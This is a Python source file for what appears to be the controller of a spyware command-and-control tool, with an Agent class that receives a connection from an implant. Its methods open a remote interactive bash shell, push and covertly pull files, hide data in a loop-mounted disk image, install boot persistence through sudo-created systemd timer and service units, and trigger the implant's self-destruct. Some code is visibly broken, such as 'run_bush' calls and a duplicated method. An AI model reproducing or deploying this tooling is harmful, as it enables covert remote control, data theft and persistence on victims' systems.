from connection import Connection
from listener import Listener
from command import Command
from responce import Responce
from funCode import FunCode
from status import Status
from contParams import *
from icecream import ic

"""this class is for controling 1 spy agent"""


class Agent:

    def __init__(self, conn: Connection, type="maneger") -> None:
        self.conn = conn
        self.type = type
        self.mountedFS = False
        self.mountPath = "" 
        self.imagePath = "" 
        self.is_hider_active = False

    def __repr__(self) -> str:
        return f"Agent(self.conn={self.conn}, self.type={self.type})"

    @classmethod
    def listenSpyware(cls, listen_addr: tuple[str, int]):
        host, port = listen_addr
        with Listener(host, port) as listener:
            conn = listener.accept()
        return Agent(conn, "spy")

    def run_bash(self, bash: str) -> tuple[Responce, str]:
        self.conn.send_command(Command(len(bash), FunCode.RUN_BASH, 0, bash))
        res = self.conn.recv_full_responce()
        print(res)
        return res

    """
    goes into loop of reading a command from stdin and executing on red side
    stops on sigint (or other exception/interrupt) or q
    """

    def bash_mode(self):
        try:
            while True:
                line = input("$ ")
                if line == "q":
                    break
                print(self.run_bash(line))
        except Exception as e:
            print(e)

    def write_file(self, homeFilePath, targetFileName: str) -> tuple[Responce, str]:

        with open(homeFilePath, "rb") as file:
            fileContent = file.read()

        self.conn.send_command(
            Command(len(fileContent), FunCode.WRITE_FILE, 0, targetFileName)
        )
        self.conn.send_data(fileContent)
        return self.conn.recv_full_responce()

    def retrieve_file(self, fileName) -> tuple[Responce, bytes]:
        self.conn.send_command(
            Command(
                0,
                FunCode.HIDDEN_OPRATION | FunCode.HIDDEN_RETREIVE_FILE,
                0,
                fileName,
            )
        )
        file_data = self.conn.recv_file()
        res = self.conn.recv_responce_struct()
        return res, file_data
    
    def list_files(self):
        self.conn.send_command(
            Command(
                0,
                FunCode.HIDDEN_OPRATION | FunCode.HIDDEN_LIST,
                0,
                '',
            )
        )
        file_data = self.conn.recv_file()
        res = self.conn.recv_responce_struct()
        return res, file_data

    def hidden_action_without_upload(
        self, fncode: FunCode, targetPath: str
    ) -> tuple[Responce, str]:
        assert FunCode.HIDDEN_UPLOAD not in fncode

        self.conn.send_command(
            Command(0, FunCode.HIDDEN_OPRATION | fncode, 0, targetPath)
        )
        results = list()
        results.append(self.conn.recv_responce_struct())
        results.append(self.conn.recv_responce_struct())
        results.append(self.conn.recv_responce_struct())
        # results.append(self.conn.recv_bytes(Status.sizeof))
        return self.conn.recv_full_responce(), results

    def hidden_action_with_upload(
        self, fncode: FunCode, homeFilePath, targetFileName: str
    ) -> tuple[Responce, str]:
        assert FunCode.HIDDEN_UPLOAD in fncode

        with open(homeFilePath, "rb") as file:
            fileContent = file.read()

        self.conn.send_command(
            Command(
                len(fileContent),
                FunCode.HIDDEN_OPRATION | fncode,
                0,
                targetFileName,
            )
        )
        self.conn.send_data(fileContent)
        results = list()
        results.append(self.conn.recv_responce_struct())
        results.append(self.conn.recv_responce_struct())
        results.append(self.conn.recv_responce_struct())
        return self.conn.recv_full_responce(), results

    # prob redundant in future
    def hider_setup(
        self, hiderPath: str, imagePath: str='', mountPath: str=''
    ) -> tuple[Responce, str]:
        self.is_hider_active = True

        # if self.mountPath:
        #     mountPath = self.mountPath

        # self.mountPath = mountPath
        # self.hiding_env_setup(mountPath, imagePath)

        strParam = hiderPath # + ";" + imagePath + ";" + mountPath
        self.conn.send_command(Command(0, FunCode.HIDER_SETUP, 0, strParam))
        return self.conn.recv_full_responce()
    
    def make_persistency(self, fileName):
        self.run_bash("cd /etc/systemd/system/")
        self.run_bash("sudo bash -c 'cat > mytimer.timer <<EOF\n[Unit]\nDescription=Run mytask periodically\n[Timer]\nOnBootSec=5\nPersistent=true\n[Install]\nWantedBy=timers.target\nEOF'")
        self.run_bash(f"sudo bash -c 'cat > myservice.service <<EOF\n[Unit]\nDescription=My Custom Service\nAfter=network.target\n\n[Service]\nType=simple\n ExecStart={fileName}\nRestart=always\nEOF'")
        self.run_bash("sudo systemctl daemon-reload")
        self.run_bash("sudo systemctl start mytimer.timer")
        self.run_bush("sudo systemctl enable mytimer.timer")
        self.run_bush("sudo systemctl status mytimer.timer")

    def hiding_env_setup(self, mountPath: str, imagePath: str):
        res = self.run_bash(f"file {imagePath}")[1]
        
        if "ext4" not in res:
            self.run_bash(f"dd if=/dev/zero of={imagePath} bs=1M count=100")
            self.run_bash(f"sudo losetup /dev/loop11 {imagePath}")
            self.run_bash(f"sudo mkfs.ext4 /dev/loop11")
            self.imagePath = imagePath
            self.mountFS(mountPath)

    def mountFS(self, mountPath=''):
        if not mountPath:
            return
        self.mountPath = mountPath
        self.run_bash(f"sudo mkdir {mountPath}")
        self.run_bash(f"sudo mount /dev/loop11 {mountPath}")

    def unmountFS(self):
        if not self.mountPath:
            return
        self.run_bash(f"sudo umount {self.mountPath}")
        self.run_bash(f"sudo rm -rf {self.mountPath}")
        self.run_bash(f"sudo rm {self.imagePath}")
        self.run_bash(f"sudo losetup -d /dev/loop11")

    def suicide(self):
        self.conn.send_command(Command(0, FunCode.SUICIDE, 0, ""))
        res = self.conn.recv_responce_struct()
        assert res.status == Status.SUICIDE_SUCSESS, "FAILED TO SUICIDE"
        return res

    def runContraption(
        self, params: ContParams, identifier: int
    ) -> tuple[Responce, str]:
        self.conn.send_command(Command(0, FunCode.RunContraption, identifier, ""))
        self.conn.send_data(bytes(params))
        res = self.conn.recv_full_responce()
        return res

    def haltContraption(self, identifier: int) -> tuple[Responce, str]:
        self.conn.send_command(Command(0, FunCode.HaltContraption, identifier, ""))
        res = self.conn.recv_full_responce()
        return res

    def haltContraption(self, identifier: int):
        self.conn.send_command(Command(0, FunCode.HaltContraption, identifier, ""))
        res = self.conn.recv_responce_struct()
        return res